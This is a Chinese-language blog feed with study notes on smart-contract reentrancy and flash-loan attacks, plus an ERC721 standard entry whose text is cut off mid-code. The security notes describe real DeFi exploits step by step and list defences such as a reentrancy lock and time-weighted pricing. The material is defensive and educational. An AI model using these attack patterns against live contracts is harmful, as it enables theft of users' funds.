<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  
  <link href="https://alphafitz.com/atom.xml" rel="self"/>
  
  <link href="https://alphafitz.com/"/>
  <updated>2022-10-24T09:07:51.725Z</updated>
  <id>https://alphafitz.com/</id>
  
  <author>
    <name>alphafitz</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>智能合约安全：重入攻击</title>
    <link href="https://alphafitz.com/2022/10/24/security-reentrancy-attack/"/>
    <id>https://alphafitz.com/2022/10/24/security-reentrancy-attack/</id>
    <published>2022-10-24T03:26:13.000Z</published>
    <updated>2022-10-24T09:07:51.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="智能合约安全：重入攻击"><a href="#智能合约安全：重入攻击" class="headerlink" title="智能合约安全：重入攻击"></a>智能合约安全：重入攻击</h1><blockquote><p>本文是视频 <a href="https://www.bilibili.com/video/BV1Nd4y1d7wH">详解常见重入攻击手段与防范策略</a> 和 <a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/S01_ReentrancyAttack/readme.md">WTF Solidity 合约安全：S01.重入攻击</a> 的学习笔记。</p></blockquote><h2 id="1-什么是重入攻击？有哪些经典的重入攻击安全事件"><a href="#1-什么是重入攻击？有哪些经典的重入攻击安全事件" class="headerlink" title="1. 什么是重入攻击？有哪些经典的重入攻击安全事件"></a>1. 什么是重入攻击？有哪些经典的重入攻击安全事件</h2><h3 id="什么是重入攻击"><a href="#什么是重入攻击" class="headerlink" title="什么是重入攻击"></a>什么是重入攻击</h3><p>重入，即重复进入，也就是“递归”的含义，本质是循环调用缺陷。</p><p>重入漏洞（或者叫做重入攻击），其产生的根源在于 solidity 智能合约的特性。重入漏洞本质是一种循环调用，类似于其他语言中的死循环调用代码缺陷。</p><p>当以太坊智能合约将 Ether 发送给未知地址（地址来源于输入或是调用者）时，可能会发生此攻击（触发 Fallback 函数）。</p><p>攻击者可以在地址对应合约的 Fallback 函数中，构建一段恶意代码。当易受攻击的合约将 Ether 发送给攻击者构建的恶意合约地址时，将执行 Fallback 函数，执行恶意代码。恶意代码可以是重新进入易受攻击的合约的相关代码，这样攻击者可以重新进入易受攻击合约，执行一些开发人员不希望执行的合约逻辑。</p><p>虽然重入攻击的历史比较久，但并没有随着时间的推移而逐渐较少。现在重入攻击事件也时常发生。</p><h3 id="曾经遭受重入攻击的项目有哪些？"><a href="#曾经遭受重入攻击的项目有哪些？" class="headerlink" title="曾经遭受重入攻击的项目有哪些？"></a>曾经遭受重入攻击的项目有哪些？</h3><p>2022 年 7 月 11 日，OMNI 合约遭受黑客重入攻击，黑客获利约 425.5 ETH。</p><p>2022 年 4 月 30 日，Fei Protocol 官方的 Rari Fuse Pool 遭受黑客攻击，黑客获利约 28380 ETH，月 8034 万美元，本次攻击主要利用了 Rari Capital 的 cEther 实现合约中的重入漏洞。</p><p>重入漏洞导致的安全事件还有很多，比如 The DAO 事件。重入在攻击中发挥了作用，最终导致以太坊经典的硬分叉。</p><h2 id="2-重入（Re-Entrance）攻击详细讲解"><a href="#2-重入（Re-Entrance）攻击详细讲解" class="headerlink" title="2. 重入（Re-Entrance）攻击详细讲解"></a>2. 重入（Re-Entrance）攻击详细讲解</h2><h3 id="1-重入攻击具体案例解读"><a href="#1-重入攻击具体案例解读" class="headerlink" title="1. 重入攻击具体案例解读"></a>1. 重入攻击具体案例解读</h3><p>下面使用一些简单的例子回顾一下以太坊转账重入攻击。</p><h4 id="1-1-含有以太坊转账重入漏洞的合约"><a href="#1-1-含有以太坊转账重入漏洞的合约" class="headerlink" title="1.1 含有以太坊转账重入漏洞的合约"></a>1.1 含有以太坊转账重入漏洞的合约</h4><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-1.png" class="" title="1.1 含有以太坊转账重入漏洞的合约"><center> 1.1 含有以太坊转账重入漏洞的合约 </center><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-2.png" class="" title="1.1 攻击流程"><center> 1.1 攻击流程 </center><p>可以看出，以太坊转账导致的重入攻击主要是由于在以太坊转账时，触发了目标的 <code>fallback</code>​ 函数，并且由于 <code>fallback</code>​ 函数可控，因此攻击者可以将回调逻辑写入 <code>fallback</code>​ 函数中，从而以开发者意想不到的执行顺序执行了代码。</p><p>此次事件也让无数开发者意识到 fallback 的负面作用。随着以太坊提案不断增多，重入的风险由以太坊转账引申到了其他标准中。</p><h4 id="其他协议重入风险"><a href="#其他协议重入风险" class="headerlink" title="其他协议重入风险"></a>其他协议重入风险</h4><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-3.png" class="" title="1.1 其他协议重入风险"><center> 1.1 其他协议重入风险 </center><p>ERC721、ERC777 和 ERC1155 相关标准代币中均实现了高级转账功能，即均有转账并通知功能。</p><p>当 ERC721、ERC1155 相关标准代币使用 <code>safeTransferFrom</code>​，<code>_safeTransfer</code>​，<code>_safeMint</code>​ 函数向合约转账或铸币均会调用通知函数（上图中给出），而 ERC777 使用 <code>send</code>​，<code>transfer</code>​，<code>operatorSend</code>​，<code>transferFrom</code>​，<code>_send</code>​，<code>_mint</code>​ 函数向合约转账或铸币也会调用目标合约的通知函数（上图中给出），如果攻击者再回调进目标业务合约，那么便有可能存在重入风险。</p><p>以 <code>safeTransferFrom_safeMint</code>​ 为例，为什么使用 <code>_safeMint</code>​ 反而不安全了呢？</p><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-4.png" class="" title="1.1 其他协议重入风险示例"><center> 1.1 其他协议重入风险示例 </center><p>步骤 2 会检查转账的目标合约里是否实现了接收函数。步骤 3 通过目标合约的 <code>selector</code>​ 判断合约是否实现了高级转账通知的功能。</p><p>这就满足了重入攻击的其中一个条件：调用目标合约的某个函数。</p><h4 id="1-2-带有调用-ERC721-相关函数造成重入漏洞例子"><a href="#1-2-带有调用-ERC721-相关函数造成重入漏洞例子" class="headerlink" title="1.2 带有调用 ERC721 相关函数造成重入漏洞例子"></a>1.2 带有调用 ERC721 相关函数造成重入漏洞例子</h4><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-5.png" class="" title="1.2 带有调用 ERC721 相关函数造成重入漏洞例子"><center> 1.2 带有调用 ERC721 相关函数造成重入漏洞例子 </center><h4 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h4><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-6.png" class="" title="1.2 攻击流程"><center> 1.2 攻击流程 </center><p>可以看出 ERC721 导致的重入攻击主要是由于在 NFT 转账时，触发了目标的 <code>onERC721Received</code>​ 函数，并且由于 <code>onERC721Received</code>​ 函数可控，因此攻击者可以将回调逻辑写入 <code>onERC721Received</code>​ 函数中，当 NFT 转账目标为合约时均会触发。</p><p>所以尽管 ERC721、ERC777、ERC1155 等标准实现了转账并通知的高级调用，但也带来了重入的风险。</p><h4 id="相关事件：idols-NFT-marketplace-重入漏洞"><a href="#相关事件：idols-NFT-marketplace-重入漏洞" class="headerlink" title="相关事件：idols NFT marketplace 重入漏洞"></a>相关事件：idols NFT marketplace 重入漏洞</h4><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-7.png" class="" title="1.2 idols NFT marketplace 重入漏洞-1"><center> 1.2 idols NFT marketplace 重入漏洞-1 </center><p>购买 <code>buyGod()</code>​ 使用了 <code>safeTransferFrom</code>​ 来转移 NFT（<code>seller -&gt; msg.sender</code>​），并且删除记账 <code>godBids[_godld]</code>​ 发生在转账后。</p><p>而另一个接受出价的函数 <code>acceptBidForBod</code>​ 中，它将删除出价操作放在了 <code>safeTransferFrom</code>​ 调用之后，这是该合约能被重入攻击的另一必要条件：在 <code>godBids[_godld]</code>​ 还没被删除时，通过调用 <code>safeTransferFrom</code>​ 从而重入调用 <code>acceptBidForGod</code>​ 使得 <code>pendingWithdrawals[msg.sender]</code>​ 能不断累加，再提现即可盗走合约中的 ETH。</p><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-8.png" class="" title="1.2 idols NFT marketplace 重入漏洞-2"><center> 1.2 idols NFT marketplace 重入漏洞-2 </center><h4 id="1-3-除此之外还有开发人员容易忽视的重入"><a href="#1-3-除此之外还有开发人员容易忽视的重入" class="headerlink" title="1.3 除此之外还有开发人员容易忽视的重入"></a>1.3 除此之外还有开发人员容易忽视的重入</h4><p>将用户输入的代币参数完全信任。重入例子：</p><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-9.png" class="" title="1.3 除此之外还有开发人员容易忽视的重入"><center> 1.3 除此之外还有开发人员容易忽视的重入 </center><h4 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h4><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-10.png" class="" title="1.3 攻击流程"><center> 1.3 攻击流程 </center><h4 id="相关事件：DeFi-借贷协议-Akropolis"><a href="#相关事件：DeFi-借贷协议-Akropolis" class="headerlink" title="相关事件：DeFi 借贷协议 Akropolis"></a>相关事件：DeFi 借贷协议 Akropolis</h4><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-11.png" class="" title="1.3 DeFi 借贷协议 Akropolis-1"><center> 1.3 DeFi 借贷协议 Akropolis-1 </center><p>重入攻击一次 <code>deposit</code>​ 两次铸币。</p><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-12.png" class="" title="1.3 DeFi 借贷协议 Akropolis-2"><center> 1.3 DeFi 借贷协议 Akropolis-2 </center><p>通过分析代码发现，在调用 <code>deposit</code>​ 函数时，用户可指定 token 参数，如下图所示：</p><img src="/2022/10/24/security-reentrancy-attack/reentrancy-attack-13.png" class="" title="1.3 DeFi 借贷协议 Akropolis-3"><center> 1.3 DeFi 借贷协议 Akropolis-3 </center><p>而 <code>deposit</code>​ 函数调用中的 <code>depositToprotocol</code>​ 函数，存在调用 <code>tkn</code>​ 地址的 <code>safeTransferFrom</code>​ 函数的方法，这就使得攻击者可以通过构造 “<code>safeTransferFrom</code>​”从而进行重入攻击。</p><h3 id="2-重入漏洞的总结"><a href="#2-重入漏洞的总结" class="headerlink" title="2. 重入漏洞的总结"></a>2. 重入漏洞的总结</h3><p>实际上发生重入在于：</p><ol><li>合约设计时未严格按照检查-生效-交互（checks-effect-interaction）模式来设计函数实现<ul><li>检查：即检查合约中账本变量的数值</li><li>生效：更改合约账本变量</li><li>交互：执行转账等操作</li></ul></li><li>在相关合约中方法中调用了目标合约的某个函数，攻击者可以控制该函数进行回调</li></ol><p>不仅是 Solidity 语言有重入漏洞的可能性，其它链也有可能因满足以上两个条件而有重入漏洞的风险。</p><h2 id="3-如何避免此类问题"><a href="#3-如何避免此类问题" class="headerlink" title="3. 如何避免此类问题"></a>3. 如何避免此类问题</h2><ol><li>严格按照上述的检查-生效-交互（checks-effect-interaction）模式的顺序实现合约的函数，即先检查状态变量是否符合要求，紧接着更新状态变量，最后再和别的合约交互；</li><li>对于合约中供用户输入的数据都进行“零信任”的检查和测试；</li><li>使用重入锁，重入锁是如下代码所示的一种防止重入函数的修饰器（modifier），包含一个默认 <code>0</code>​ 状态的 <code>_status</code>​。第一次调用时会加锁，在调用结束后才会释放锁。这样当攻击合约在调用结束前的第二次调用就会报错，重入攻击失败。</li></ol><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// 重入锁</span><span class="token builtin">uint256</span> <span class="token keyword">private</span> _status<span class="token punctuation">;</span> <span class="token comment">// 重入锁</span><span class="token comment">// 重入锁</span><span class="token keyword">modifier</span> <span class="token function">nonReentrant</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 在第一次调用 nonReentrant 时，_status 将是 0</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>_status <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"ReentrancyGuard: reentrant call"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 在此之后对 nonReentrant 的任何调用都将失败</span>    _status <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token comment">// 调用结束，将 _status 恢复为0</span>    _status <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 只需要用 `nonReentrant` 重入锁修饰 `withdraw()` 函数即可预防重入攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;智能合约安全：重入攻击&quot;&gt;&lt;a href=&quot;#智能合约安全：重入攻击&quot; class=&quot;headerlink&quot; title=&quot;智能合约安全：重入攻击&quot;&gt;&lt;/a&gt;智能合约安全：重入攻击&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本文是视频 &lt;a href=&quot;https:</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约安全" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊" scheme="https://alphafitz.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="DeFi" scheme="https://alphafitz.com/tags/DeFi/"/>
    
    <category term="智能合约安全" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>智能合约安全：闪电贷攻击</title>
    <link href="https://alphafitz.com/2022/10/24/security-flashload-attack/"/>
    <id>https://alphafitz.com/2022/10/24/security-flashload-attack/</id>
    <published>2022-10-24T03:12:39.000Z</published>
    <updated>2022-10-24T03:24:56.900Z</updated>
    
    <content type="html"><![CDATA[<h1 id="智能合约安全：闪电贷攻击"><a href="#智能合约安全：闪电贷攻击" class="headerlink" title="智能合约安全：闪电贷攻击"></a>智能合约安全：闪电贷攻击</h1><h1 id="闪电贷攻击"><a href="#闪电贷攻击" class="headerlink" title="闪电贷攻击"></a>闪电贷攻击</h1><blockquote><p>本文是视频 <a href="https://www.bilibili.com/video/BV1Fd4y1B7k3">详解闪电贷攻击手段@BuidlerDAO</a> 的学习笔记。</p></blockquote><h2 id="1-什么是闪电贷？闪电贷与区块链安全讲解"><a href="#1-什么是闪电贷？闪电贷与区块链安全讲解" class="headerlink" title="1. 什么是闪电贷？闪电贷与区块链安全讲解"></a>1. 什么是闪电贷？闪电贷与区块链安全讲解</h2><p>闪电贷就是在单笔交易中贷出借款人的金额，在交易结束时，借款人必须偿还不少于贷款金额的数目。如果借款人做不到，则交易就会自动回滚，就像贷款根本没有发生一样。主要包括三点特征：</p><ol><li>​闪电贷是一种无抵押贷款；</li><li>所有闪电贷都是通过区块链上的智能合约完成的；</li><li>贷款过程是即时的，一个区块内完成贷款和还款。</li></ol><h3 id="Uniswap-Swap-闪电贷"><a href="#Uniswap-Swap-闪电贷" class="headerlink" title="Uniswap Swap() 闪电贷"></a>Uniswap Swap() 闪电贷</h3><p>V2 核心合约 Pair（即供给池）的 swap 函数实现了 calldata 调用，并且可以让用户先兑后还。假设有一个支持 DAI&#x2F;ETH 的 Pair（供给池），一开始 ETH 会从 Pair 借出到外部套利合约，然后 Pair 会去调用套利合约实现的 uniswapV2Call 接口。uniswapV2Call 中可以完成一系列的“闪电”业务，之后 uniswapV2Call 再将相应的 ETH 或者 DAI 返还给 Pair。Pair 对 uniswapV2Call 调用结束后，会进行最终的账目核对。如果 Pair 没有收到足够的 ETH 或者 DAI，那么整个交易都将回滚。因此对于套利者，借出一笔 ETH 后，必须在该原子交易结束前再将 ETH 或 DAI 返还（并付上 0.3% 的费率），才能保证整个闪电兑换的成功。</p><p>闪电贷交互分为三部分：</p><ul><li>借贷<ul><li>兑换数量和储备校验</li><li>检查：接收方地址（to）不能是 tokenA 和 tokenB 的地址</li><li>将 tokenA 和 tokenB 贷出</li></ul></li><li>调用目标合约接口<ul><li>​<code>IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);</code>​ 调用闪电贷接口完成业务逻辑</li></ul></li><li>还款<ul><li>校验还款金额 &gt;&#x3D; 贷款 + 费用</li><li>K 值校验</li><li>更新储备金</li></ul></li></ul><h3 id="Aave-flashLoan-闪电贷"><a href="#Aave-flashLoan-闪电贷" class="headerlink" title="Aave flashLoan() 闪电贷"></a>Aave flashLoan() 闪电贷</h3><ul><li>函数参数：<code>function flashLoan(address _receiver, address _reserve, uint256 _amount, bytes memory _apras) ...</code>​<ul><li>参数：接收地址、Token 地址、数量、接收方接口参数（跨合约调用时传入参数）</li></ul></li><li>函数流程<ul><li>查询可借贷的流动性</li><li>确保有足够的数量能够借出</li><li>计算费用：借贷费用 + 协议费用</li><li>代币转给接收地址</li><li>跨合约调用目标闪电贷接口</li><li>检查借贷+费用是否还清</li><li>更新合约状态</li></ul></li></ul><h3 id="闪电贷与区块链安全"><a href="#闪电贷与区块链安全" class="headerlink" title="闪电贷与区块链安全"></a>闪电贷与区块链安全</h3><p>闪电贷本身的存在是没有漏洞的，但使用者可以以极低的成本撬动巨量资金，在多个协议之间进行价格操纵等。2022 年上半年使用闪电贷进行黑客攻击的案例总计 21 次，占比 26.6%，涉及金额高达 3 亿 3291 万美元。其中上半年影响较大的攻击手段有闪电贷加治理攻击，闪电贷加价格操纵攻击，闪电贷加重入攻击等。</p><h3 id="闪电贷攻击案例一"><a href="#闪电贷攻击案例一" class="headerlink" title="闪电贷攻击案例一"></a>闪电贷攻击案例一</h3><p>2021 年 6 月 23 日，基于币安智能链（BSC）的稳定币交易平台 Nerve Finance 受到闪电贷加逻辑漏洞攻击，损失高达 460 万美元。</p><p>其原因在于紧急提取功能<code>emergencyBurn</code>​ 没有销毁存放在合约中的 NRV-LP 代币。</p><p>攻击过程：</p><ol><li>闪电贷 242W BUSD 并在稳定币 Nerve 3Pool 中兑换为 241 万枚 3NVR-LP；</li><li>攻击者将 241 万枚 3NRV-LP 添加至 ElevenNeverSellVault 合约后获得 241 万枚 11Pool3 Nerve。紧急取出在 ElevenNeverSellVault 合约添加的 241 万枚 3NRV-LP；</li><li>重复过程 2；</li><li>将通过攻击的 3NRC-LP 兑换为 BUSD，偿还闪电贷并将获利的资金转给钱包。</li></ol><h3 id="闪电贷攻击案例二"><a href="#闪电贷攻击案例二" class="headerlink" title="闪电贷攻击案例二"></a>闪电贷攻击案例二</h3><p>2022 年 4 月 17 日，算法稳定币项目 Beanstalk Farms 遭到闪电贷加治理攻击，黑客获利 7600 万美元，协议损失 8200 万美元。</p><p>攻击过程大致如下：准备阶段：由于在 BEAN 合约中，所有治理行动都有 1 天的延迟，即提案后 1 天才能开始投票，所以攻击者实际上是在前一天提出两个治理提案，其中，第一个提案（提议18）提取合约中所有的钱。下一个提案（提议19）将价值 25 万美元的 $BEAN 发送到乌克兰的捐款地址。该攻击主要利用了投票合约中的投票是通过代币余额查询和校验的，然后调用 <code>emergencyCommit</code>​ 进行紧急提交以执行该提议。</p><p>攻击阶段：</p><ol><li>攻击者从 Synapse 协议桥（最初来自 Tornado.cash）获取初始资金；</li><li>利用闪电贷获得价值超 10 亿资金：从 Aave 获得 3.5 亿 DAI，5 亿 USDC 和 1.5 亿 USDT；从 Uniswap v2 获得 3200 万 BEAN；从 SushiSwap 获得 1160 万 LUSD；</li><li>这些代币被用来为 Curve 池子增加流动性，临时获得巨额的提案代币，保证了提案不需要其他人投票也能通过。<ul><li>Curve.fi DAI&#x2F;USDC&#x2F;USDT 交易池新增 DAI、USDC、USDT，最终获得了 979,691,328 3Crv流动性代币</li><li>其中 15,000,000 3Crv 兑换 15,251,318 LUSD</li><li>将 964,691,328 个 3Crv 代币兑换成 795,425,740 BEAN3CRV-f 进行投票，并为 32,100,950 BEAN 和 26,894,383 LUSD 增加流动性，获得 58,924,887 BEANLUSD-f 流动性代币。</li></ul></li></ol><p>本案例中是通过闪电贷获得大量的治理代币发起攻击。</p><h3 id="闪电贷攻击案例三"><a href="#闪电贷攻击案例三" class="headerlink" title="闪电贷攻击案例三"></a>闪电贷攻击案例三</h3><p>2022 年 6 月 22 日，PandoraDAO 遭遇闪电贷加价格操纵攻击，造成了约 12.8 万美元的损失。</p><p>其原因在于查询价格的预言机设计存在问题。</p><p>攻击步骤：</p><ol><li>通过从 USDT-PCD 合约中闪贷大量 USDT 来准备价格操纵；</li><li>此时数量发生变化，价格也发生了变化，调用 <code>shouchan</code>​ 函数以极低价格购买 PCD 代币，并锁仓；</li><li>解锁，并通过 PancakeSwap 卖出。</li></ol><p>本案例中是直接通过闪电贷获得代币发起攻击。</p><h3 id="闪电贷攻击案例四"><a href="#闪电贷攻击案例四" class="headerlink" title="闪电贷攻击案例四"></a>闪电贷攻击案例四</h3><p>​2022 年 3 月 15 日，OMNI 协议遭受闪电贷加重入攻击，黑客共获取了 362 万枚 USDC，169 万枚 xDAI，16 枚 WBTC，24 枚 WETH，价值超过 600 万美元。</p><p>其原因在于：</p><ol><li>ERC667BridgeToken 中的 <code>transfer</code>​ 函数中的钩子 <code>callafterTransfer</code>​ 实现了调用目标合约的功能（使得能够多次发起调用）；</li><li>​<code>borrow</code>​ 函数中并未按照检查-生效-交互模式实现逻辑，并且没有防重入修饰器修饰该函数（可以实现回调）；</li></ol><p>攻击流程：</p><ol><li>从 SushiSwap 中进行闪电贷，209 万 USDC，337 万 WXDAI；</li><li>随后，攻击者创建了多个合约同时存款借贷然后进行重入获利，可以查看其中一个地址 <code>0xbE8fe2aE087aeCcB1E46EF206368421c9212637B</code>​。</li></ol><h2 id="2-如何减缓闪电贷攻击？"><a href="#2-如何减缓闪电贷攻击？" class="headerlink" title="2. 如何减缓闪电贷攻击？"></a>2. 如何减缓闪电贷攻击？</h2><h3 id="1-要求关键交易跨越两个区块"><a href="#1-要求关键交易跨越两个区块" class="headerlink" title="1. 要求关键交易跨越两个区块"></a>1. 要求关键交易跨越两个区块</h3><p>如果一个资本密集型交易需要跨越至少两个区块，用户需要至少在两个区块时间段取出贷款，那么闪电贷攻击将会失效。但是要达到这一效果，两个区块之间用户价值必须锁定，以防止其偿还贷款。</p><h3 id="2-时间加权平均定价"><a href="#2-时间加权平均定价" class="headerlink" title="2. 时间加权平均定价"></a>2. 时间加权平均定价</h3><p>在价格操纵案例中，建议使用时间加权平均价格（TWAP）来跨多个区块计算流动性池中的价格。因为整个攻击交易序列需要在同一个区块内处理，但如果不操纵整个区块链就无法操纵 TWAP，从而可以避免闪电贷导致的瞬时价格异常。</p><h3 id="3-更高频率的价格更新机制"><a href="#3-更高频率的价格更新机制" class="headerlink" title="3. 更高频率的价格更新机制"></a>3. 更高频率的价格更新机制</h3><p>同样在价格操作案例中，可以适当增加流动性池向预言机查询并更新价格的频率，随着更新次数的增加，池中代币的价格会更新得更快，并使价格操纵无效。</p><h3 id="4-更严格的治理逻辑"><a href="#4-更严格的治理逻辑" class="headerlink" title="4. 更严格的治理逻辑"></a>4. 更严格的治理逻辑</h3><p>在涉及到项目治理时，应该多方面考虑治理逻辑的严谨性，避免出现 Beanstalk Farms 那样的逻辑漏洞，一旦有个微小的漏洞，就有可能通过闪电贷无限放大，最后造成巨大的损失。</p><h3 id="5-必要时禁止跨合约调用"><a href="#5-必要时禁止跨合约调用" class="headerlink" title="5. 必要时禁止跨合约调用"></a>5. 必要时禁止跨合约调用</h3><p>使用 <code>require(tx.origin == msg.sender)</code>​ 禁止跨合约调用。</p><h2 id="3-如何监控闪电贷攻击？"><a href="#3-如何监控闪电贷攻击？" class="headerlink" title="3. 如何监控闪电贷攻击？"></a>3. 如何监控闪电贷攻击？</h2><p>上述建议一定程度上可以减缓闪电贷攻击，但是有些方案过程复杂，且代价过大，在实际项目中难以实现。在无法完全解决闪电贷攻击的前提下，能及时准确的监控闪电贷攻击就显得尤为重要。比如使用监控平台或风险预警系统来对交易进行实时监控。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;智能合约安全：闪电贷攻击&quot;&gt;&lt;a href=&quot;#智能合约安全：闪电贷攻击&quot; class=&quot;headerlink&quot; title=&quot;智能合约安全：闪电贷攻击&quot;&gt;&lt;/a&gt;智能合约安全：闪电贷攻击&lt;/h1&gt;&lt;h1 id=&quot;闪电贷攻击&quot;&gt;&lt;a href=&quot;#闪电贷攻击&quot; c</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约安全" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊" scheme="https://alphafitz.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="DeFi" scheme="https://alphafitz.com/tags/DeFi/"/>
    
    <category term="智能合约安全" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ERC721 非同质化代币标准</title>
    <link href="https://alphafitz.com/2022/10/23/erc721-non-fungible-token-standard/"/>
    <id>https://alphafitz.com/2022/10/23/erc721-non-fungible-token-standard/</id>
    <published>2022-10-23T09:56:30.000Z</published>
    <updated>2022-10-23T09:57:44.458Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ERC721-非同质化代币标准"><a href="#ERC721-非同质化代币标准" class="headerlink" title="ERC721 非同质化代币标准"></a>ERC721 非同质化代币标准</h1><blockquote><p>以太坊改进建议：<a href="https://eips.ethereum.org/EIPS/eip-721">EIP-721: Non-Fungible Token Standard</a></p></blockquote><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>该标准允许在智能合约中实现用于 NFT 的标准 API。该标准提供了跟踪和转移 NFT 的基本功能，是一个允许钱包&#x2F;经纪人&#x2F;拍卖应用程序在以太坊上处理 NFT 的标准接口。</p><h2 id="ERC721-接口"><a href="#ERC721-接口" class="headerlink" title="ERC721 接口"></a>ERC721 接口</h2><p>任何 ERC721 兼容合约都必须实现 ERC721 和 ERC165 接口。</p><h3 id="Transfer"><a href="#Transfer" class="headerlink" title="Transfer"></a>Transfer</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">event</span> <span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> _from<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">indexed</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> <span class="token keyword">indexed</span> _tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>在 NFT 的所有权发生改变时需要触发。</li><li>在 NFT 被创建（<code>_from == 0</code>）和被销毁（<code>_to == 0</code>）该事件触发。</li></ul><h3 id="Approval"><a href="#Approval" class="headerlink" title="Approval"></a>Approval</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">event</span> <span class="token function">Approval</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> _owner<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">indexed</span> _approved<span class="token punctuation">,</span> <span class="token builtin">uint256</span> <span class="token keyword">indexed</span> _tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>在 NFT 的批准地址(approved address)改变或重新设置时触发。</li><li>零地址意味着没有批准地址。</li><li>当 Transfer 事件触发时，这也意味着该 NFT 的批准地址被设置为空(none)。</li></ul><h3 id="ApprovalForALL"><a href="#ApprovalForALL" class="headerlink" title="ApprovalForALL"></a>ApprovalForALL</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">event</span> <span class="token function">ApprovalForAll</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> _owner<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">indexed</span> _operator<span class="token punctuation">,</span> <span class="token builtin">bool</span> _approved<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>在为所有者(owner)启用或禁用 operator 时触发。</li><li>该 operator 可以管理该所有者的所有 NFT。</li></ul><h3 id="balanceOf"><a href="#balanceOf" class="headerlink" title="balanceOf"></a>balanceOf</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token 